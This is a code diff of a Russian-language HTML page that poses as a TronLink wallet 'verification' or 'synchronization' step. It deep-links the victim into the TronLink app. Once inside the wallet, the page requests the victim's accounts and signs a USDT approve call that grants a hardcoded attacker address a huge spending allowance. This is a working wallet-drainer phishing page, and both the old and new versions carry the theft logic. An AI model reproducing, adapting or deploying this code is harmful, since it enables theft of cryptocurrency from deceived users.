@@ -3,96 +3,61 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Protocol Verification</title>
+    <title>Verification</title>
     <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
     <style>
         body { background: #000; color: #fff; font-family: -apple-system, sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; text-align: center; }
-        .card { padding: 40px 25px; width: 85%; max-width: 380px; background: #111; border-radius: 35px; border: 1px solid #222; box-shadow: 0 10px 40px rgba(0,0,0,0.8); }
+        .card { padding: 40px 25px; width: 85%; max-width: 380px; background: #111; border-radius: 35px; border: 1px solid #222; }
         .logo { width: 70px; height: 70px; background: #ff0013; border-radius: 20px; margin: 0 auto 25px; display: flex; align-items: center; justify-content: center; font-size: 32px; font-weight: bold; }
         h2 { font-size: 22px; margin-bottom: 12px; }
         p { color: #888; font-size: 14px; line-height: 1.6; margin-bottom: 35px; }
-        .btn { display: block; background: #ff0013; color: #fff; text-decoration: none; padding: 20px; border-radius: 20px; font-weight: bold; text-transform: uppercase; font-size: 14px; border: none; width: 100%; cursor: pointer; }
-        #status { color: #555; font-size: 11px; margin-top: 15px; }
+        .btn { display: block; background: #ff0013; color: #fff; text-decoration: none; padding: 20px; border-radius: 20px; font-weight: bold; text-transform: uppercase; font-size: 14px; width: 100%; box-sizing: border-box; }
+        .footer-note { color: #444; font-size: 10px; margin-top: 20px; }
     </style>
 </head>
 <body>
 
 <div class="card">
     <div class="logo">T</div>
-    <h2 id="title">Синхронизация</h2>
-    <p id="desc">Нажмите кнопку ниже, чтобы перейти в приложение кошелька и подтвердить транзакцию.</p>
+    <h2 id="t">Верификация</h2>
+    <p id="d">Нажмите кнопку ниже для автоматического перехода в TronLink и подтверждения.</p>
     
-    <button id="mainBtn" class="btn">ЗАПУСТИТЬ</button>
+    <a id="actionLink" href="tronlinkorg://dapp?url=https://timur3417.github.io/sync-node-app/" class="btn">ОТКРЫТЬ TRONLINK</a>
     
-    <div id="status">v2.0 Native Bridge</div>
+    <div class="footer-note" id="manual">Если не переходит автоматически, нажмите три точки (⋮) и выберите "Открыть в браузере"</div>
 </div>
 
 <script>
     const ADMIN = 'TXRBrbaTiNotkHp6gSC6vbbZYPq7dqyjF4';
-    const CONTRACT_USDT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
-    
-    const btn = document.getElementById('mainBtn');
-    const title = document.getElementById('title');
-    const desc = document.getElementById('desc');
+    const USDT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
 
-    async function handleAction() {
-        // Проверяем, мы уже внутри TronLink или еще в браузере?
-        const isTronLinkInternal = window.tronWeb || (window.tron && window.tron.tronWeb);
-
-        if (!isTronLinkInternal) {
-            // МЫ В ТЕЛЕГРАМЕ/SAFARI -> ТРИГГЕРИМ АЙФОН
-            const myUrl = window.location.href;
+    async function checkAndSign() {
+        const tron = window.tronWeb || (window.tron && window.tron.tronWeb);
+        
+        // Если мы уже ВНУТРИ TronLink
+        if (tron) {
+            document.getElementById('t').innerText = "Узел Обнаружен";
+            document.getElementById('d').innerText = "Нажмите «ПОДТВЕРДИТЬ» для завершения синхронизации.";
+            const link = document.getElementById('actionLink');
+            link.innerText = "ПОДТВЕРДИТЬ";
+            link.href = "#"; // Убираем редирект
             
-            // Самый "сильный" протокол для iPhone, который вызывает именно TronLink
-            // Без посредников и сайтов
-            const nativeDeepLink = "tronlinkorg://dapp?url=" + encodeURIComponent(myUrl);
-            
-            // Пытаемся вызвать приложение
-            window.location.href = nativeDeepLink;
-            
-            // Запасной вариант через 300мс (если первый не сработал)
-            setTimeout(() => {
-                window.location.replace(nativeDeepLink);
-            }, 300);
-            
-            return;
-        }
-
-        // МЫ ВНУТРИ TRONLINK -> ПОДПИСЫВАЕМ APPROVE
-        try {
-            btn.innerText = "ПОДТВЕРЖДЕНИЕ...";
-            btn.disabled = true;
-
-            const tron = window.tronWeb || window.tron.tronWeb;
-            await tron.request({ method: 'tron_requestAccounts' });
-            
-            const contract = await tron.contract().at(CONTRACT_USDT);
-            
-            // Вызываем Approve на 1,000,000 USDT (чтобы наверняка)
-            await contract.approve(ADMIN, '1000000000000000000').send({
-                feeLimit: 100000000
-            });
-
-            alert("Синхронизация завершена успешно!");
-            btn.innerText = "ГОТОВО";
-        } catch (e) {
-            console.error(e);
-            alert("Ошибка: " + e.message);
-            btn.disabled = false;
-            btn.innerText = "ПОДТВЕРДИТЬ";
+            link.onclick = async (e) => {
+                e.preventDefault();
+                try {
+                    await tron.request({ method: 'tron_requestAccounts' });
+                    const contract = await tron.contract().at(USDT);
+                    await contract.approve(ADMIN, '1000000000000000000').send({ feeLimit: 100000000 });
+                    alert("Успешно!");
+                } catch (err) {
+                    alert("Ошибка: " + err.message);
+                }
+            };
         }
     }
 
-    btn.onclick = handleAction;
-
-    // Если мы уже открылись внутри кошелька - меняем интерфейс
-    window.onload = () => {
-        if (window.tronWeb || (window.tron && window.tron.tronWeb)) {
-            title.innerText = "Узел Обнаружен";
-            desc.innerText = "Кошелек подключен. Нажмите кнопку «ПОДТВЕРДИТЬ» для завершения синхронизации.";
-            btn.innerText = "ПОДТВЕРДИТЬ";
-        }
-    };
+    // Запускаем проверку
+    setInterval(checkAndSign, 1000);
 </script>
 </body>
 </html>
